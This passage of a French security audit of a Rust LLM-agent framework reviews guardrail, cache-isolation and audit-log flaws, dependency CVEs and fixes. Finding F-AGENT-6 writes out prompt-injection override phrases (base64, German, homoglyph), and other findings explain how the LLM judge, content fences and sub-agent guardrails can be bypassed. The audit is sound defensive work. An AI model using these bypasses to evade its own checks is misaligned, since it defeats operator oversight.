- **Fix** : muter `call.name` en amont (avant pre_tool/permissions) et émettre `AgentEvent::ToolNameRepaired` ; OU plus défensif, retourner `error("Tool not found")` et laisser le LLM corriger.

#### F-AGENT-2 — **Critical** — Sub-agents `delegate_task` n'héritent pas des `guardrails` de l'orchestrator
- **File** : `agent/orchestrator.rs:402-434`
- **Risque** : `SpawnAgentTool` (orchestrator.rs:1296-1298) propage bien `self.guardrails` ; `delegate_task` non. Asymétrie silencieuse — un opérateur sécurisant l'orchestrator pense couvrir le périmètre, mais le délégué (qui *exécute en réalité* les tools) tourne avec uniquement ses guardrails locaux (souvent vides).
- **Fix** : composer toujours `self.guardrails + agent_def.guardrails` via `GuardrailChain` lors du build sub-agent.

#### F-AGENT-3 — High — `ResponseCache` cache key sans `tenant_id`/`user_id`
- **File** : `agent/cache.rs:71-88` ; `agent/runner.rs:189`
- **Risque** : si l'identité user n'est pas dans le `system_prompt`, deux tenants posant la même question hittent la même clé → réponse cross-tenant servie. La pratique daemon (cf MEMORY.md) injecte l'identité dans le prompt → en pratique OK, mais c'est une convention non vérifiée par le code.
- **Fix** : ajouter `cache_namespace: &str` à `compute_key` ; `AgentRunner` fournit `audit_tenant_id` au moment du calcul.

#### F-AGENT-4 — High — `LlmJudgeGuardrail` fail-open silencieux (pas d'audit/event)
- **File** : `agent/guardrails/llm_judge.rs:177-184`
- **Risque** : timeout/erreur judge → `Allow`. Seul un `tracing::warn!` est émis (invisible au SIEM event-based). Attaquant peut tester sans laisser de trace audit en saturant le judge (prompt énorme).
- **Fix** : retourner `GuardAction::Warn { reason }` au lieu d'`Allow` (génère un `GuardrailWarned` event + audit) ; rendre `fail_closed: bool` configurable ; métrique `heartbit_judge_fail_open_total`.

#### F-AGENT-5 — High — `post_tool` guardrail denial perd `tenant_id`/`user_id` dans audit
- **File** : `agent/runner.rs:2125-2126`
- **Risque** : tous les autres `AuditRecord` du fichier utilisent `self.audit_user_id`/`tenant_id` ; ce site-là met `None`. Un attaquant trigger des denials sans trace tenant attribuable.
- **Fix** : remplacer par `self.audit_user_id.clone()` / `self.audit_tenant_id.clone()`.

#### F-AGENT-6 — High — `InjectionClassifier` bypass trivial (base64, Unicode, multilingue)
- **File** : `agent/guardrails/injection.rs:81-109` ; `sensor_security.rs:67-74`
- **Risque** : matching littéral lowercased anglo-centré. Bypass via base64 (`aWdub3JlIGFsbCBwcmV2aW91cyBpbnN0cnVjdGlvbnM=`), rot13, traduction (`Ignorieren Sie alle vorherigen Anweisungen`), homoglyphes (`іgnore` U+0456 cyrillique).
- **Fix** : NFKC normalize + détection homoglyphes ; flag des blocs base64 (entropie + length%4) ; patterns multilingues (DE, ES, FR, ZH minimum) ; doc clarifiant que ce guardrail est best-effort, insister sur LlmJudge.

#### F-AGENT-7 — High — Blackboard sans isolation entre sub-agents
- **File** : `agent/blackboard.rs:55-95` ; `agent/blackboard_tools.rs:37-140`
- **Risque** : sub-agent A peut écrire/lire la clé `agent:B` (résultat attendu de B). Un sub-agent compromis (prompt injection via input externe) influence les autres sub-agents de la squad. Cross-agent influence non auditée.
- **Fix** : namespace les keys par caller (préfixe auto `{caller}:user-key`) ; réserver `agent:` pour l'orchestrator ; logger en audit toute écriture avec caller identity.

#### F-AGENT-8 — Medium — `tool_profile` ne filtre que la liste *envoyée* au LLM, pas `self.tools` exécutables
- **File** : `agent/runner.rs:577-580` ; `tool_filter.rs:186-203`
- **Risque** : LLM peut halluciner ou se rappeler `bash` (historique résumé) et l'appeler ; l'exécution réussit car `self.tools` n'est pas filtrée.
- **Fix** : doc explicite que `tool_profile` n'est PAS un boundary de sécurité (utiliser `tool_policy`) OU filtrer aussi `self.tools` au build.

#### F-AGENT-9 — Medium — `SensorSecurity` boundary ID prédictible (nanos + low-32 stack address)
- **File** : `agent/guardrails/sensor_security.rs:77-86`
- **Risque** : un attaquant qui peut envoyer plusieurs emails à intervalle court peut deviner le boundary ID et injecter un faux marker `|||FENCE:<predicted>|||`.
- **Fix** : `rand::random::<u64>()` x2 ou `Uuid::new_v4()`.

#### F-AGENT-10 — Medium — `ActionBudget` incrémente le compteur AVANT denial
- **File** : `agent/guardrails/action_budget.rs:82-103`
- **Risque** : mineur, comptage légèrement biaisé après denial. Pas de race exploitable au runner courant (séquentiel).
- **Fix** : check `count + 1 > max_calls` puis incrémenter UNIQUEMENT si Allow.

#### F-AGENT-11 — Medium — `ContentFenceGuardrail` marker non échappé
- **File** : `agent/guardrails/content_fence.rs:44-62`
- **Risque** : email contenant `|||END_UNTRUSTED_EMAIL_CONTENT|||` casse la fence ; `SensorSecurityGuardrail` corrige avec boundary unique (mais cf F-AGENT-9 prédictibilité), `ContentFence` reste exposé en re-export public bien que `deprecated` en doc-comment.
- **Fix** : `#[deprecated]` Rust attribute (warning compilation) ou `pub(crate)` + retirer du re-export.

#### F-AGENT-12 — Low — `GuardrailChain::post_llm` : ordering implicite Warn vs Deny
- **File** : `agent/guardrails/compose.rs:62-93`
- **Risque** : signal fidelity, pas bypass.
- **Fix** : documenter clairement ; collecter tous les Warn même quand Deny final.

#### F-AGENT-13 — Low — `LearnedPermissions` TOML sans cap taille/profondeur
- **File** : `agent/permission.rs:148-164`
- **Fix** : cap fichier (1 MiB max) + cap `rules.len()`.

#### F-AGENT-14 — Info — ReDoS non applicable (Rust `regex` est NFA sans backtracking).

#### F-AGENT-15 — Info — Pattern phone PII US-centric (E.164 international à ajouter).

---

### 3.8 — Dépendances (cargo audit) — analyse path-of-use

**`cargo tree -p heartbit-core --invert <crate>`** vérifié pour chaque CVE remontée par `cargo audit` sur le workspace. Résultat : seules les CVE de `rustls-webpki` sont effectivement dans l'arbre de dépendances de `heartbit-core` (via `reqwest → hyper-rustls → rustls`). Les autres viennent d'autres crates du workspace (probablement `heartbit-cloud`/`heartbit-cli`) et **n'affectent pas heartbit-core**.

**CVE applicables à heartbit-core** :

| ID | Crate | Version | Severity (réelle) | Patch | Chaîne |
|---|---|---|---|---|---|
| RUSTSEC-2026-0049 | rustls-webpki | 0.103.9 | Medium (CRL/Distribution Point matching) | ≥ 0.103.10 | `reqwest → hyper-rustls → rustls` |
| RUSTSEC-2026-0098 | rustls-webpki | 0.103.9 | Medium (URI name constraints) | ≥ 0.103.12 | idem |
| RUSTSEC-2026-0099 | rustls-webpki | 0.103.9 | Medium (wildcard sous name constraints) | ≥ 0.103.12 | idem |
| RUSTSEC-2026-0104 | rustls-webpki | 0.103.9 | **High** (panic réachable parsing CRL) | ≥ 0.103.13 | idem |

**Action heartbit-core** : `cargo update -p rustls-webpki` (≥ 0.103.13 corrige les 4 CVE simultanément).

**CVE NON applicables à heartbit-core** (vérifié `cargo tree --invert` → résultat vide) :

- ~~RUSTSEC-2023-0071 (rsa Marvin timing)~~ — **Inerte** : `rsa` n'est pas dans l'arbre de heartbit-core.
- ~~RUSTSEC-2026-0037 (quinn-proto DoS)~~ — **Inerte** : `quinn-proto` (HTTP/3) non activé via reqwest dans cette config.

À noter pour les autres crates du workspace (heartbit-cloud, heartbit-cli) : ces deux CVE doivent être réévaluées dans leur audit propre.

**Warnings** (unmaintained / unsound) :
- `core2 0.4.0` — yanked, unmaintained
- `number_prefix 0.4.0` — unmaintained
- `paste 1.0.15` — unmaintained
- `rand 0.8.5` + `0.9.2` — unsound avec custom logger via `rand::rng()`

---

## 4. Priorisation par contexte de déploiement

Toutes les findings ne pèsent pas le même poids selon comment heartbit-core est embarqué. Trois contextes distincts :

### 4.0a — CLI mono-utilisateur local (`heartbit run`/`chat` interactif)

Le LLM tourne sous l'identité de l'utilisateur, pas de réseau exposé, pas de tenants multiples.

- **Inertes** : F-MCP-3 (McpServer no auth — pas mounted), F-AGENT-3 (cache cross-tenant — un seul tenant), F-MEM-1 (cross-namespace prune — pas de namespaces), F-KB-1 (KnowledgeBase tenant — single-tenant), F-AUTH-3/F-AUTH-6 (audit modes — perso), F-AGENT-7 (blackboard isolation — single-agent), F-MEM-5 (legacy tenant compat).
- **Critiques pour ce contexte** : F-FS-1 (TOCTOU symlink → écriture FS arbitraire si LLM jailbreaké), F-FS-2 (env exfil → vol des clés API perso), F-AGENT-1 (Levenshtein bypass), F-LLM-1 (clé API exfil sur redirect), F-MCP-1 (SSRF MCP client), F-AGENT-6 (injection bypass via base64).
- **Restent applicables** : tout le reste du FS/exec, du réseau/SSRF, et des LLM providers.

### 4.0b — Daemon multi-tenant (`heartbit daemon` cloud-style)

C'est le pire cas : tous les Critical et High s'appliquent. La triade isolation cross-tenant + bypass guardrails + exfil credentials est exposée intégralement.

- **Tous les 6 Critical applicables** sans exception.
- **Tous les 21 High applicables** sans exception.
- Insister sur F-MCP-3 (auth obligatoire avant mount), F-MEM-1/F-MEM-2/F-KB-1 (cross-tenant leak), F-AGENT-3 (cache cross-tenant), F-AGENT-7 (cross-agent influence).

### 4.0c — Bibliothèque embarquée (autre app importe `heartbit-core` comme crate)

L'application hôte est responsable du tenant model et de l'auth. heartbit-core fournit les primitives.

- **À documenter dans la doc API** : (a) `tool_profile` n'est PAS un boundary de sécurité (F-AGENT-8), (b) `McpServer::handle_request` exige auth middleware externe (F-MCP-3), (c) `ContentFenceGuardrail` est `#[deprecated]` (F-AGENT-11), (d) si runner partagé entre tenants, l'identité doit être dans le `system_prompt` (F-AGENT-3).
- **Critiques pour ce contexte** : F-LLM-1, F-MCP-1, F-AGENT-1, F-AGENT-2 — l'app hôte ne peut pas mitiger ces bugs depuis l'extérieur.

---

## 4. Recommandations stratégiques

### 4.1 — Quick wins (1-2 jours)

1. **`Client::builder().redirect(Policy::none()).timeout(...).https_only(true)`** sur tous les LLM providers (corrige F-LLM-1, F-LLM-2, F-LLM-8 d'un seul commit, ~30 LOC).
2. **`SafeUrl::parse` dans `McpClient::connect_http` et `TokenExchangeAuthProvider::new`** (F-MCP-1, ~10 LOC). Idem `agent_card.url` dans A2A (F-MCP-12).
3. **Caps explicites SSE + body** : `MAX_LINE_LEN`, `MAX_TOOL_CALLS`, `MAX_BODY_BYTES` (F-LLM-3,4,5 + F-MCP-4 + F-NET-1 + F-KB-2,3, ~80 LOC).
4. **Repair Levenshtein en amont des guardrails** (F-AGENT-1, ~15 LOC dans `runner.rs`).
5. **Propagation `guardrails` orchestrator → delegate** (F-AGENT-2, ~5 LOC dans `orchestrator.rs`).
6. **`cargo update -p rustls-webpki -p quinn-proto`** (4 CVE corrigées).

### 4.2 — Hardening structurel (1-2 semaines)

1. **`O_NOFOLLOW` + canonicalize post-write** dans Write/Patch + helper `CorePathPolicy::check_path_for_create` officiel (F-FS-1, F-FS-6).
2. **`EnvPolicy::default() = Allowlist(DAEMON_ENV_ALLOWLIST)`** + filtre actif `*_KEY|*_TOKEN|*_SECRET` même en `Inherit` (F-FS-2).
3. **Path-policy sur glob/grep/list** + sandbox `default = ["sandbox"]` (F-FS-4, F-FS-5).
4. **`McpServer` auth callback obligatoire** + LRU sessions (F-MCP-3).
5. **MCP tool name préfixe `mcp_<server>_<tool>`** + sanitize description (F-MCP-2).
6. **`KnowledgeBase` trait avec `TenantScope`** (F-KB-1).
7. **`PermissionRule::matches` récursif sur arrays/nested** (F-AUTH-1).
8. **Audit `strip_content` allow-list récursif** + `MetadataOnly` strip `result_preview`/`error` (F-AUTH-3).
9. **Blackboard caller-namespacé** (F-AGENT-7).
10. **`shared_memory_read` cap Confidentiality par défaut** + refus `Restricted` LLM-driven dans `MemoryStoreTool` (F-MEM-2, F-MEM-6).

### 4.3 — Évolutions à plus long terme

1. **DNS rebinding mitigation** : `reqwest::dns::Resolve` custom qui re-vérifie au connect-time (F-NET-2).
2. **`InjectionClassifier` v2** : NFKC normalize, détection base64/homoglyphes, patterns multilingues, ou délégation systématique à LlmJudge (F-AGENT-6).
3. **Privacy-by-default** : `AuditMode::default() = MetadataOnly` (F-AUTH-6, breaking change).
4. **Cascade observability per-tenant** : émission systématique `AgentEvent::ModelEscalated` + métriques tenant + cap `max_escalations_per_window` (F-LLM-7).
5. **`LlmJudge` fail-closed configurable** + métriques fail-open (F-AGENT-4).
6. **MCP sampling** : si jamais implémenté, prévoir budget+whitelist modèles dès le départ (F-MCP-9).
7. **macOS sandbox** : intégration `sandbox-exec` ou refus `bash` si `path_policy` requise (F-FS-5).

---

## 5. Méthodologie

- **7 agents `general-purpose` parallèles** (LLM Opus 4.7), chacun avec un périmètre exclusif. Lecture intégrale via `Read` (avec offsets multiples sur les gros fichiers : mcp.rs 3873L, patch.rs 1113L, permission.rs 782L, runner.rs ~2500L).
- **Format de findings imposé** : titre, sévérité, file:line, attack scenario, snippet code preuve, why-it's-a-problem, remediation. Refus des "potentiellement / pourrait" sans evidence concrète.
- **Cross-validation manuelle** par le coordinateur sur les findings Critical (F-FS-1 confirmé via lecture de `write.rs:101-114` ; F-LLM-1 confirmé via lecture du source de reqwest 0.12 `redirect.rs:243-249` ; F-MCP-1 confirmé via grep des call sites dans `heartbit-cli/src/daemon/`).
- **`cargo audit`** sur le workspace ; analyse des advisories pertinentes au path d'utilisation.
- **Verifications structurelles** : `rg "(secret|token|api_key|password|hmac).*=="` (aucun match), `rg "ct_eq_str|subtle::"` (utilisé dans heartbit-cli/daemon/auth.rs, donc pas dead code), `rg "unsafe\b"` (3 occurrences non-test : Landlock pre_exec dans bash.rs — légitime).

**Vérifications primary-source effectuées par le coordinateur** :
- F-LLM-1 — lecture directe de `~/.cargo/registry/src/.../reqwest-0.12.28/src/redirect.rs:239-251` : la fonction `remove_sensitive_headers` strippe **uniquement** `AUTHORIZATION`, `COOKIE`, `"cookie2"`, `PROXY_AUTHORIZATION`, `WWW_AUTHENTICATE` quand `cross_host == true`. Ni `x-api-key` ni `x-goog-api-key` ne sont strippés.
- F-AGENT-1 — relecture directe de `runner.rs:1986-2076` : `find_closest_tool` n'a qu'un seul site d'appel (1997), dans `execute_tools_parallel`, **après** que `eval_permission` (1186) et `pre_tool` (1375) aient utilisé `call.name` original. Aucune ré-évaluation post-repair.
- CVE deps — `cargo tree -p heartbit-core --invert` confirme que rsa et quinn-proto sont absents de l'arbre de heartbit-core. Seul `rustls-webpki` (via `reqwest → hyper-rustls → rustls`) y est.
- F-AUTH (constant-time) — `rg "subtle::|ConstantTimeEq"` confirme que `ct_eq_str` n'est référencé que dans `auth/ct.rs` au sein de heartbit-core, mais **utilisé** par `heartbit-cli/src/daemon/auth.rs:62` (`validate_bearer_token`) — donc pas dead-code. Aucun `==` direct sur un secret nommé dans heartbit-core.

**Limites de l'audit** :
- Pas de fuzz testing dynamique (parser JSON-RPC, SSE, patch unified diff).
- Pas de PoC d'exploitation actif (test Rust prouvant le TOCTOU F-FS-1 ou le bypass Levenshtein F-AGENT-1) — recommandé en suite.
- Pas de revue cryptographique formelle (hmac/sha1/subtle utilisés correctement à première vue, mais pas vérifié au niveau bit).

**Suite recommandée** :
- Auditer `heartbit-cli/src/daemon/` — c'est là que vivent les vrais validateurs Bearer / JWT et tous les call sites de F-MCP-1, F-MCP-12, F-MCP-14. Plusieurs findings de cet audit sont mitigeables ou aggravables selon ce que fait le daemon.
- Auditer `heartbit-sensors`, `heartbit-telegram`, `heartbit-cloud` (séparément).
- Écrire les PoC Rust de F-FS-1 (TOCTOU symlink) et F-AGENT-1 (Levenshtein bypass) — petits tests `#[tokio::test]` pour blinder les Critical.
- Réévaluer les CVE rsa Marvin et quinn-proto DoS dans le contexte des autres crates du workspace.
